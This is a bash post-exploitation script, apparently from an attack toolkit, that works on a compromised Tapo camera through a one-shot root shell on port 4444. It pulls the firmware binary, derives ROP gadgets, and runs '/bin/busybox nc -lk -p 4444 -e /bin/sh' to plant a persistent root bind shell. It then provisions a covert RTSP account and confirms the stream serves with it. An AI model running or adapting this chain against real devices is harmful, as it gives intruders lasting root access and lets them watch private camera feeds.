#!/bin/bash
# Post-shell chain: convert the one-shot :4444 root shell into the FSS endstate.
#
# The bind shell is one-shot by construction (tapo_bind4444.S accepts once and then *becomes*
# /bin/sh), and the crashed worker dies with it. So the order is fixed and every step is bounded:
#
#   1. recon + pull the artifacts that only a root shell can give: /proc/mtd, /bin/main, libc
#      (before anything can restart the process and lose them)
#   2. derive the unit's own offsets/gadgets from /bin/main (tools/tapo_oracle/find_chain.py)
#   3. install the repeatable ROP shell (`nc -lk`, no longer one-shot)
#   4. provision the RTSP third account over the DS API, soft-reset, then *verify* 554 with an
#      authenticated DESCRIBE — config acceptance is not a listener
#
# The RTSP account is the FSS ingest credential: e2e_capture_rtsp.sh consumes the printed pair.
#
# The soft reset reboots the unit, so the repeatable ROP shell dies with it and the stack address
# (per-boot) is stale: getting root back after this point needs a fresh presence + FORCE=1 fire and
# a re-derive, not a ROP replay. That is why the reset is last.
#
#   c460_postshell.sh <host> [--skip-rtsp]
#
# Artifacts: /tmp/pane1/<host>/ (recon.txt, bin_main, proc_mtd, chain.*, rtsp_cred.txt, chain.log)
# Exit: 0 endstate reached, 2 an artifact step failed, 3 no shell, 4 gadget derivation failed,
#       5 ROP shell did not come back, 6 RTSP not serving.
set -u
HOST=${1:?host}
SKIP_RTSP=0
[ "${2:-}" = "--skip-rtsp" ] && SKIP_RTSP=1

HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
OUT="${OUTDIR:-/tmp/pane1/$HOST}"
SHELL_PORT="${SHELL_PORT:-4444}"
WAIT="${WAIT:-120}"
CHAIN="${CHAIN:-$ROOT/tools/tapo_oracle/find_chain.py}"
POST_TOOL="${POST_TOOL:-$HERE/tapo_post.py}"
ROP_TOOL="${ROP_TOOL:-$HERE/tapo_connectap_rop.py}"
OBJDUMP="${OBJDUMP:-arm-none-eabi-objdump}"
PY="${PY:-python3}"
mkdir -p "$OUT"
LOG="$OUT/chain.log"

log() { printf '%s %s\n' "$(date '+%H:%M:%S')" "$*" | tee -a "$LOG"; }
die() { log "STOP: $*"; exit "${2:-2}"; }

shell_up() { nc -z -G 2 "$HOST" "$SHELL_PORT" >/dev/null 2>&1; }
wait_shell() {
  local end=$(( $(date +%s) + $1 )) i=0
  while [ "$(date +%s)" -lt "$end" ]; do
    shell_up && return 0
    i=$(( i + 1 )); [ $(( i % 10 )) -eq 0 ] && log "waiting for :4444 ($(( end - $(date +%s) ))s)"
    sleep 1
  done
  return 1
}

wait_shell "$WAIT" || die "no shell on $HOST:4444 within ${WAIT}s" 3
log "shell present — recon + pull"

# --- 1. recon and pulls ----------------------------------------------------------------------
"$POST_TOOL" "$HOST" --pull --port "${PORT:-5555}" 2>&1 | tee -a "$LOG"
[ -s "$OUT/proc_mtd" ] || die "/proc/mtd pull is empty" 2
[ -s "$OUT/bin_main" ] || die "/bin/main pull is empty" 2
[ "$(head -c 4 "$OUT/bin_main" | od -An -tx1 | tr -d ' \n')" = "7f454c46" ] \
  || die "/bin/main is not an ELF (pull corrupt)" 2
log "pulled $(wc -c < "$OUT/proc_mtd") B of mtd map and $(wc -c < "$OUT/bin_main") B of /bin/main"

# --- 2. derive the unit's own chain ----------------------------------------------------------
command -v "$OBJDUMP" >/dev/null 2>&1 || die "$OBJDUMP missing (brew install arm-none-eabi-binutils)" 4
"$PY" "$CHAIN" "$OUT/bin_main" --json > "$OUT/chain.json" 2>> "$LOG"
"$PY" "$CHAIN" "$OUT/bin_main" > "$OUT/chain.txt" 2>> "$LOG" \
  || die "find_chain could not derive the chain (see $OUT/chain.txt)" 4
ARGS=$(awk '/tapo_connectap_rop\.py/ { sub(/^.*--offset /, "--offset "); print }' "$OUT/chain.txt")
[ -n "$ARGS" ] || die "find_chain printed no argument line" 4
log "chain: $ARGS"

# --- 3. repeatable ROP shell -----------------------------------------------------------------
# shellcheck disable=SC2086
"$ROP_TOOL" "$HOST" $ARGS \
  --cmd "/bin/busybox nc -lk -p 4444 -e /bin/sh &" 2>&1 | tee -a "$LOG"
sleep 2
wait_shell "$WAIT" || die "the ROP shell never came back — repeat the ROP by hand" 5
log "repeatable root shell up"

[ "$SKIP_RTSP" = 1 ] && { log "RTSP skipped (--skip-rtsp)"; exit 0; }

# --- 4. RTSP provisioning (the FSS ingest account) -------------------------------------------
PASS=$(python3 -c 'import secrets; print(secrets.token_urlsafe(12))')
umask 077
printf '%s %s\n' fssuser "$PASS" > "$OUT/rtsp_cred.txt"
umask 022
"$POST_TOOL" "$HOST" --rtsp-enable --rtsp-user fssuser --rtsp-pass "$PASS" \
  --rtsp-reset 2>&1 | tee -a "$LOG" || die "RTSP provisioning was not accepted" 6
log "config accepted; soft reset sent — waiting for the unit to return"

# The unit is rebooting: presence says it is back, not that 554 is already bound. But "config
# accepted" is still not a listener, so the probe is retried a bounded number of times and only the
# FINAL verdict decides. The first attempt carries the presence wait; later ones do not block on it.
TRIES="${RTSP_PROBE_TRIES:-6}"
GAP="${RTSP_PROBE_GAP:-5}"
rc=1
for i in $(seq 1 "$TRIES"); do
  if [ "$i" = 1 ]; then
    "$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" \
      --wait "${RTSP_WAIT:-10}" 2>&1 | tee -a "$LOG"
  else
    "$POST_TOOL" "$HOST" --rtsp-verify --rtsp-user fssuser --rtsp-pass "$PASS" 2>&1 | tee -a "$LOG"
  fi
  rc=${PIPESTATUS[0]}
  [ "$rc" = 0 ] && break
  if [ "$i" -lt "$TRIES" ]; then
    log "554 not serving yet (attempt $i/$TRIES) — retrying in ${GAP}s"
    sleep "$GAP"
  fi
done
[ "$rc" = 0 ] || die "554 does not serve with the account after $TRIES attempts" 6

log "ENDSTATE reached — account in $OUT/rtsp_cred.txt"
log "next: deliverables/scripts/e2e_capture_rtsp.sh $HOST fssuser '<pass>'"
exit 0
